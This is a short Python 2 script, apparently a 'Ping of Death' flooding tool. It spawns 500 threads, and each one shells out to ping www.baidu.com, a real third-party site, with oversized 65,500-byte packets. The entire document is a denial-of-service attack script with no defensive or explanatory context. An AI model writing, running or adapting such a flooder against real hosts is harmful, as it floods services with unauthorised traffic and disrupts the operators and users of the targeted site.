import subprocess
import thread
import time

def POD(id):
    ret = subprocess.call("ping www.baidu.com -l 65500",shell=True)
    print ("%d,") % id

for i in range(500):
    thread.start_new_thread(POD,(i,))
    time.sleep(0.8)
